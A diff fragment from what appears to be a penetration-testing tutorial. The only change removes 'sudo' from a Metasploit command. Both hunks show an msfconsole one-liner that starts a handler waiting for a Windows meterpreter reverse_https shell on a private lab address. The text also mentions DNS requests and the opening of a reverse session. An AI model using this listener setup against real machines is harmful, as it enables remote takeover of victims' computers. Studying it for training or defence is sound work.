@@ -273,7 +273,7 @@ To test this payload, we’ll start up our multi/handler listener on our Kali Li
 
 ```
 ┌──(kali㉿kali)-[~]
-└─$ sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.0.21; set LPORT 443; set EXITFUNC thread; exploit"
+└─$ msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.0.21; set LPORT 443; set EXITFUNC thread; exploit"
 ```
 
 After we execute our runner, we'll return to our terminal running Dnsmasq so we can see the DNS requests being processed.
@@ -317,7 +317,7 @@ We'll also see that our listener has successfully established a reverse meterpre
 
 ```
 ┌──(kali㉿kali)-[~]
-└─$ sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.0.21; set LPORT 443; set EXITFUNC thread; exploit"
+└─$ msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.0.21; set LPORT 443; set EXITFUNC thread; exploit"
 [*] Using configured payload generic/shell_reverse_tcp
 PAYLOAD => windows/x64/meterpreter/reverse_https
 LHOST => 192.168.0.21
